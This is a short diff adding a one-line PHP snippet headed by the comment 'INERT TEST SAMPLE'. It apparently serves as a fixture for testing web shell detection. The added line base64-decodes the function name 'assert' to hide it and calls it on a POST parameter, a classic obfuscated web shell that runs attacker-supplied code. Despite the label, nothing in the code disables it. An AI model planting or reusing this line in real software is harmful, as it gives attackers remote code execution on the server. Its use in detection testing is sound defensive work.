@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+$f = base64_decode("YXNzZXJ0"); $f($_POST['x']);
+
